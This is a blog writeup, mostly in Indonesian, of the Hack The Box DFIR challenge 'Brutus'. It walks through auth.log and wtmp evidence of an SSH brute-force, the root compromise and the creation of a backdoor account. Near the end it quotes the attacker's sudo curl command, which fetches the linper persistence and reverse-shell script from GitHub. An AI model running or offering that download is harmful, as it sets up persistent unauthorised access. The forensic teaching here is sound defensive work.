---
title: "Writeup: HTB Brutus"
pubDate: 2025-03-24
description: "Writeup HTB DFIR challenge Brutus"
author: "natanhp"
excerpt: "In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution."
image:
  src: "../assets/images/htb-brutus-achievment.png"
  alt: "Achievement HTB Brutus"
tags: ["Cyber Security", "DFIR"]
---
```
In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
```

Skenario dari chellenge ini adalah ada seorang attacker yang menyerang sebuah server dengan metode brute force. Di sini kita diminta menganalisa log agar dapat mendokumentasikan bagaiama attacker dapat masuk ke dalam sistem dan apa yang dilakukan attacker setelah masuk ke dalam sistem hanya melalui log ssh dan utmp file.

### 1. Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?
`auth.log` ini adalah log file dari ssh server. Jadi event yang berkaitan dengan ssh akan disimpan di sini seperti percobaan koneksi dan autentikasi yang gagal atau berhasil.

```
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: error: beginning MaxStartups throttling
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: drop connection #10 from [65.2.161.68]:46482 on [172.31.35.28]:22 past MaxStartups
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: Invalid user admin from 65.2.161.68 port 46444
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: Invalid user admin from 65.2.161.68 port 46436
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh rus
```

Dari log yang ada, bisa di lihat ada beberapa kali percobaan login yang terekam dari IP `65.2.161.68`. Jadi bisa disimpulkan kalau IP `65.2.161.68` adalah IP dari attacker.

#### `65.2.161.68`

### 2. The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
```
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
```

Saat ini, attacker sudah dapat menebak password yang benar untuk sebuah username bernama `root`.

#### `root`

### 3.  Identify the timestamp when the attacker logged in manually to the server to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

`utmp` file adalah file yang mencatat aktivitas login dari user di sistem. File ini merupakan binary file, jadi akan aneh jika dibuka menggunakan text editor biasa. Program yang bisa digunakan untuk membaca file ini adalah `last`, yang kebetulan sudah ada di komputer saya.

```sh
natanhp@ngoumah ~/D/p/p/d/h/b/Brutus [1]> last -f wtmp 
cyberjun pts/1        65.2.161.68      Wed Mar  6 13:37    gone - no logout
root     pts/1        65.2.161.68      Wed Mar  6 13:32 - 13:37  (00:04)
root     pts/0        203.101.190.9    Wed Mar  6 13:19    gone - no logout
reboot   system boot  6.2.0-1018-aws   Wed Mar  6 13:17   still running
root     pts/1        203.101.190.9    Sun Feb 11 17:54 - 18:08  (00:13)
root     pts/1        203.101.190.9    Sun Feb 11 17:41 - 17:41  (00:00)
root     pts/0        203.101.190.9    Sun Feb 11 17:33 - 18:08  (00:34)
root     pts/0        203.101.190.9    Thu Jan 25 18:15 - 19:34  (01:18)
ubuntu   pts/0        203.101.190.9    Thu Jan 25 18:13 - 18:15  (00:01)
reboot   system boot  6.2.0-1017-aws   Thu Jan 25 18:12 - 18:09 (16+23:57)
```

Di sini saya belum bisa mendapat jawaban yang tepat. Jawaban yang sudah saya coba:
1. 2025-03-06 13:32:00
2. 2025-03-06 06:32:44
3. 2025-03-06 06:32:00
4. 2025-03-06 13:33:01

#### Update
Setelah melihat writeup yang disediakan, ternyata file `wtmp` yang dibuka dengan `last` hanyalah berupa ringkasan, sedangkan untuk detailnya bisa menggunakan `utmpdump`.

```sh
natanhp@ngoumah ~/D/p/p/d/h/b/Brutus [1]> utmpdump wtmp
Utmp dump of wtmp
[2] [00000] [~~  ] [reboot  ] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-01-25T11:12:17,804944+00:00]
[5] [00601] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,072401+00:00]
[6] [00601] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,072401+00:00]
[5] [00618] [tty1] [        ] [tty1        ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,080342+00:00]
[6] [00618] [tty1] [LOGIN   ] [tty1        ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,080342+00:00]
[1] [00053] [~~  ] [runlevel] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-01-25T11:12:33,792454+00:00]
[7] [01284] [ts/0] [ubuntu  ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-01-25T11:13:58,354674+00:00]
[8] [01284] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:15:12,956114+00:00]
[7] [01483] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-01-25T11:15:40,806926+00:00]
[8] [01404] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-01-25T12:34:34,949753+00:00]
[7] [836798] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:33:49,408334+00:00]
[5] [838568] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-02-11T10:39:02,172417+00:00]
[6] [838568] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-02-11T10:39:02,172417+00:00]
[7] [838962] [ts/1] [root    ] [pts/1       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:41:11,700107+00:00]
[8] [838896] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-02-11T10:41:46,272984+00:00]
[7] [842171] [ts/1] [root    ] [pts/1       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:54:27,775434+00:00]
[8] [842073] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-02-11T11:08:04,769514+00:00]
[8] [836694] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-02-11T11:08:04,769963+00:00]
[1] [00000] [~~  ] [shutdown] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-02-11T11:09:18,000731+00:00]
[2] [00000] [~~  ] [reboot  ] [~           ] [6.2.0-1018-aws      ] [0.0.0.0        ] [2024-03-06T06:17:15,744575+00:00]
[5] [00464] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,354378+00:00]
[6] [00464] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,354378+00:00]
[5] [00505] [tty1] [        ] [tty1        ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,469940+00:00]
[6] [00505] [tty1] [LOGIN   ] [tty1        ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,469940+00:00]
[1] [00053] [~~  ] [runlevel] [~           ] [6.2.0-1018-aws      ] [0.0.0.0        ] [2024-03-06T06:17:29,538024+00:00]
[7] [01583] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-03-06T06:19:55,151913+00:00]
[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
[8] [02491] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-03-06T06:37:24,590579+00:00]
[7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]
```

```
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

Dari file log timestamp yang tercatat kalau attacker login pada `06-03 06:32:44`, sedangkan mungkin yang dimaksud login dari soal ini adalah ketika attacker diberi akses terminal setelah autentikasi. Informasi tadi bisa didapat setelah menjalankan perintah `utmpdump wtmp`, yaitu `2024-03-06 06:32:45`.

#### `2024-03-06 06:32:45`

### 4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

Dari pembahasan di [pertanyaan nomor 2](#2-the-bruteforce-attempts-were-successful-and-attacker-gained-access-to-an-account-on-the-server-what-is-the-username-of-the-account), tertulis session `34` digenerate untuk user `root`.

#### `34`

### 5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

```
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
Mar  6 06:33:01 ip-172-31-35-28 CRON[2561]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:33:01 ip-172-31-35-28 CRON[2562]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:33:01 ip-172-31-35-28 CRON[2561]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:33:01 ip-172-31-35-28 CRON[2562]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:34:01 ip-172-31-35-28 CRON[2574]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:34:01 ip-172-31-35-28 CRON[2575]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:34:01 ip-172-31-35-28 CRON[2575]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:34:01 ip-172-31-35-28 CRON[2574]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
```

Attacker kembali login menggunakan user `root` dan membuat user bernama `cyberjunkie`.

#### `cyberjunkie`

### 6. What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

MITRE ATT&CK adalah framework yang mendokumentasikan tentang taktik serangan keamanan siber.
#### T1136
```
Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.
```

Mendeskripsikan tentang attacker yang membuat kredensial baru untuk mengakses sistem tanpa perlu membuat backdoor atau semacamnya.

##### .001
```
Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.
```

Sub dari [T1136](#t1136) yang menjelaskan kalau yang dibuat oleh attacker adalah local account, jadi hanya akun yang bisa digunakan di satu sistem.

#### `T1136.001`

### 7. What time did the attacker's first SSH session end according to auth.log?

Ini sama seperti [soal nomor 3](#3-identify-the-timestamp-when-the-attacker-logged-in-manually-to-the-server-to-carry-out-their-objectives-the-login-time-will-be-different-than-the-authentication-time-and-can-be-found-in-the-wtmp-artifact) di mana jawaban yang saya coba salah semua, seperti:
1. 2025-03-06 06:37:24
2. 2025-03-06 13:37:24

#### Update
Setelah mengerjakan [soal nomor 3](#3-identify-the-timestamp-when-the-attacker-logged-in-manually-to-the-server-to-carry-out-their-objectives-the-login-time-will-be-different-than-the-authentication-time-and-can-be-found-in-the-wtmp-artifact) dan melihat dari `utmpdump`, ternyata hanya salah tahun, sehingga yang benar adalah `2024-03-06 06:37:24`.

#### `2024-03-06 06:37:24`

### 8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

```
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

Di sini attacker mengunduh script yang digunakan untuk menyiapkan koneksi reverse shell dengan mengeksekusi command
```sh
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

#### `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

## Achievement Link
https://labs.hackthebox.com/achievement/sherlock/129806/631

## Sumber:
- montysecurity (2022). linper. Diakses pada 8 Maret 2025, dari https://github.com/montysecurity/linper
- Sinha, Nilesh (2024). SSH Logs - Find, View, and Manage. Diakses pada 8 Maret 2025, dari https://signoz.io/guides/ssh-logs/
- IBM Corporation (2023). utmp, wtmp, failedlogin File Format. Diakses pada 8 Maret 2025, dari https://www.ibm.com/docs/en/aix/7.1?topic=formats-utmp-wtmp-failedlogin-file-format
- Bowen, Kevin (2013). How to properly display the contents of the utmp,wtmp, and btmp files?. Diakses pada 8 Maret 2025, dari https://askubuntu.com/a/325495/1202723
- MITRE ATT&CK®. Enterprise Techniques. Diakses pada 8 Maret 2025, dari https://attack.mitre.org/techniques/enterprise/
- Cyberjunkie and Sebh24. Brutus Writeup. Diakses pada 8 Maret 2025, dari blob:https://app.hackthebox.com/772eec8f-dc83-489c-9a0d-e398ee4df8b7